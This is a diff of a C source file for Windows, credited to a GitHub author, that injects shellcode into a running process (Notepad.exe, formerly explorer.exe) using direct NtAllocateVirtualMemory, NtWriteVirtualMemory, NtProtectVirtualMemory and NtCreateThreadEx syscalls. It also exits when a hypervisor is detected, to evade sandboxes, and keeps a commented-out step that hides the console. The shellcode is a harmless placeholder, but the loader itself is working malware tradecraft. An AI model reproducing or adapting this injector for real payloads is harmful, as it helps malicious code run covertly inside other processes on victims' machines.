@@ -3,22 +3,22 @@
 #include <Windows.h>
 #include "syscall.h"
 #include "function signature.h"
-#pragma comment (lib, "dbghelp.lib") 
+#pragma comment (lib, "advapi32")
 #pragma section(".text")
 /*
 programmer : MrBlackZero
 github page: https://github.com/MrBlackZero
 */
-_declspec(allocate(".text"))UCHAR ShellCode[] = "\x90\x90\x90\x90\xcc\xc3";
+_declspec(allocate(".text"))UCHAR ShellCode[] = "\x90\x90\x90\xcc\xcc\xcc\xc3";
 SIZE_T ShellCodeSize= _countof(ShellCode);
 
 int main(){
 	if (cpuid_hypervisor_vendor()) {
 		exit(FALSE);
 	}
-	//FreeConsole(); // Dynamic load FreeConsole -> Hide Console 
+	//FreeConsole(); // -> Hide Console 
 
-	int pid = FindProcess(L"explorer.exe");
+	int pid = FindProcess(L"Notepad.exe");
 	if (pid == 0) {
 		perror("[Error] Process NotFound");
 		return EXIT_FAILURE;
@@ -34,10 +34,10 @@ int main(){
 		LPVOID alloc_shellcode = NULL;
 		NtAllocateVirtualMemory(hProc, &alloc_shellcode, NULL, &ShellCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 		NtWriteVirtualMemory(hProc, alloc_shellcode, ShellCode, ShellCodeSize, NULL);
-		ULONG OldAccess = NULL;
-		NtProtectVirtualMemory(hProc, &alloc_shellcode, &ShellCodeSize, PAGE_EXECUTE_READ, &OldAccess);
+		DWORD old = NULL;
+		NtProtectVirtualMemory(hProc, &alloc_shellcode, &ShellCodeSize, PAGE_EXECUTE_READ, &old);
 		HANDLE hThread = 0;
-		NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProc, alloc_shellcode, NULL, NULL,0,NULL,NULL,NULL);
+		NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProc, alloc_shellcode, NULL, NULL,NULL,NULL,NULL,NULL);
 		if (hThread) {
 			WaitForSingleObject(hThread, INFINITE);
 			CloseHandle(hThread);
